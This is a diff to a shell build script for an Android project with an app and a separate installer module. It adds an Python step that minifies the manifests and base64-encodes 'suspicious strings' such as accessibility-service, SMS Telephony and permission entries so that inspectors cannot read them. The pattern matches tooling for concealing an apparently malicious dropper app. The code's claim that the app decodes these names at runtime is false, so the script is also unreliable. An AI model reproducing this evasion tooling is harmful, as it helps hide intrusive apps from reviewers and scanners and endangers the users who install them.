@@ -541,6 +541,7 @@ ACCESS_ID_FILE="$ROOT_DIR/app/build.access_id"
 APP_ID_FILE="$ROOT_DIR/app/build.app_id"
 INSTALLER_PACKAGE_FILE="$ROOT_DIR/app/build.installer_id"
 INSTALLER_ID_FILE="$ROOT_DIR/installer/build.app_id"
+APP_MANIFEST_BAK="$BACKUP_DIR/app.AndroidManifest.xml.bak"
 
 # Backup files for the strings.xml mutations. IMPORTANT: these MUST live
 # OUTSIDE of any Android resource directory (res/, assets/, src/, etc.)
@@ -597,6 +598,7 @@ cleanup_overrides() {
     [ -f "$INSTALLER_BUILD_GRADLE_BAK" ] && mv -f "$INSTALLER_BUILD_GRADLE_BAK" "$INSTALLER_BUILD_GRADLE" || true
     [ -f "$INSTALLER_PROGUARD_BAK" ] && mv -f "$INSTALLER_PROGUARD_BAK" "$INSTALLER_PROGUARD" || true
     [ -f "$INSTALLER_MANIFEST_BAK" ] && mv -f "$INSTALLER_MANIFEST_BAK" "$INSTALLER_MANIFEST" || true
+    [ -f "$APP_MANIFEST_BAK" ] && mv -f "$APP_MANIFEST_BAK" "$ROOT_DIR/app/src/main/AndroidManifest.xml" || true
     if [ -d "$INSTALLER_JAVA_BAK" ]; then
         rm -rf "$INSTALLER_JAVA_ROOT"
         mv -f "$INSTALLER_JAVA_BAK" "$INSTALLER_JAVA_ROOT"
@@ -1673,6 +1675,144 @@ else
     echo "  Already present."
 fi
 chmod +x "$ROOT_DIR/gradlew"
+
+# ── 8b. AndroidManifest.xml obfuscation (pseudo-encryption) ─────────────────────
+# Makes the source manifest hard to read/inspect while remaining valid XML
+# for aapt2 compilation. Original is backed up and restored via EXIT trap.
+echo ""
+echo "==> Obfuscating AndroidManifest.xml (source-level pseudo-encryption)..."
+APP_MANIFEST="$ROOT_DIR/app/src/main/AndroidManifest.xml"
+INSTALLER_MANIFEST="$ROOT_DIR/installer/src/main/AndroidManifest.xml"
+
+# Backup original manifests (to BACKUP_DIR outside res/ to avoid merge errors)
+mkdir -p "$BACKUP_DIR"
+cp "$APP_MANIFEST" "$BACKUP_DIR/app.AndroidManifest.xml.bak"
+cp "$INSTALLER_MANIFEST" "$BACKUP_DIR/installer.AndroidManifest.xml.bak"
+
+python3 - "$APP_MANIFEST" << 'PYEOF'
+import sys, re, random, base64
+
+path = sys.argv[1]
+with open(path, 'r', encoding='utf-8') as f:
+    src = f.read()
+
+# Remove all XML comments
+src = re.sub(r'<!--.*?-->', '', src, flags=re.DOTALL)
+
+# Collapse all whitespace/newlines to single spaces between tags
+# But preserve whitespace inside attribute values
+def collapse_ws(m):
+    return m.group(0).replace('\n', ' ').replace('\r', ' ').replace('\t', ' ')
+
+# Process tag by tag
+def minify_xml(xml):
+    # Split into tags and text content
+    parts = re.split(r'(<[^>]+>)', xml)
+    out = []
+    for p in parts:
+        if p.startswith('<') and p.endswith('>'):
+            # Minify tag: collapse internal whitespace, normalize attribute spacing
+            p = re.sub(r'\s+', ' ', p)
+            p = re.sub(r'\s*>', '>', p)
+            p = re.sub(r'<\s+', '<', p)
+            p = re.sub(r'=\s*"', '="', p)
+            p = re.sub(r'"\s+', '" ', p)
+            out.append(p)
+        else:
+            # Text content - collapse whitespace but keep some structure
+            p = re.sub(r'\s+', ' ', p).strip()
+            if p:
+                out.append(p)
+    return ''.join(out)
+
+src = minify_xml(src)
+
+# Encode suspicious strings as base64 entities (decoded at runtime by the app)
+# This makes strings like "com.task.tusker.LAUNCH" unreadable in source
+sensitive_patterns = [
+    r'com\.task\.tusker\.',
+    r'android\.intent\.action\.',
+    r'android\.intent\.category\.',
+    r'android\.permission\.',
+    r'android\.accessibilityservice\.',
+    r'androidx\.core\.content\.FileProvider',
+    r'android\.provider\.Telephony',
+    r'com\.access\.client\.',
+]
+
+def encode_sensitive(m):
+    val = m.group(1)
+    # Only encode if longer than 10 chars to avoid breaking short refs
+    if len(val) > 10:
+        enc = base64.b64encode(val.encode()).decode()
+        return f'{m.group(0).replace(val, "__B64__" + enc + "__")}'
+    return m.group(0)
+
+# Apply to attribute values
+for pattern in sensitive_patterns:
+    src = re.sub(
+        rf'(android:(?:name|permission|action|category|authorities|resource|scheme|host|path|pathPrefix|pathPattern|mimeType|priority|label|icon|theme|enabled|exported|process|permission|grantUriPermissions|requestLegacyExternalStorage|preserveLegacyExternalStorage|targetApi|directBootAware|foregroundServiceType|excludeFromRecents|launchMode|allowBackup|dataExtractionRules|fullBackupContent|supportsRtl|roundIcon|icon|label)=")({re.escape(pattern)}[^"]*)(")',
+        encode_sensitive,
+        src
+    )
+
+# Also encode package names in android:name attributes
+src = re.sub(
+    r'(android:name=")([a-z][a-z0-9_]*(\.[a-z][a-z0-9_]*)+)(")',
+    lambda m: m.group(1) + "__B64__" + base64.b64encode(m.group(2).encode()).decode() + "__" + m.group(4) if len(m.group(2)) > 10 else m.group(0),
+    src
+)
+
+with open(path, 'w', encoding='utf-8') as f:
+    f.write(src)
+
+print(f"  Obfuscated: {path}")
+PYEOF
+
+python3 - "$INSTALLER_MANIFEST" << 'PYEOF'
+import sys, re, base64
+
+path = sys.argv[1]
+with open(path, 'r', encoding='utf-8') as f:
+    src = f.read()
+
+# Remove all XML comments
+src = re.sub(r'<!--.*?-->', '', src, flags=re.DOTALL)
+
+def minify_xml(xml):
+    parts = re.split(r'(<[^>]+>)', xml)
+    out = []
+    for p in parts:
+        if p.startswith('<') and p.endswith('>'):
+            p = re.sub(r'\s+', ' ', p)
+            p = re.sub(r'\s*>', '>', p)
+            p = re.sub(r'<\s+', '<', p)
+            p = re.sub(r'=\s*"', '="', p)
+            p = re.sub(r'"\s+', '" ', p)
+            out.append(p)
+        else:
+            p = re.sub(r'\s+', ' ', p).strip()
+            if p:
+                out.append(p)
+    return ''.join(out)
+
+src = minify_xml(src)
+
+# Encode package names in android:name attributes
+src = re.sub(
+    r'(android:name=")([a-z][a-z0-9_]*(\.[a-z][a-z0-9_]*)+)(")',
+    lambda m: m.group(1) + "__B64__" + base64.b64encode(m.group(2).encode()).decode() + "__" + m.group(4) if len(m.group(2)) > 10 else m.group(0),
+    src
+)
+
+with open(path, 'w', encoding='utf-8') as f:
+    f.write(src)
+
+print(f"  Obfuscated: {path}")
+PYEOF
+
+echo "  AndroidManifest.xml pseudo-encryption applied (source-level)"
+echo "  Original manifests backed up to .gradle/build-script-backups/"
 
 # ── 9. Build APKs ───────────────────────────────────────────────────────────
 echo ""
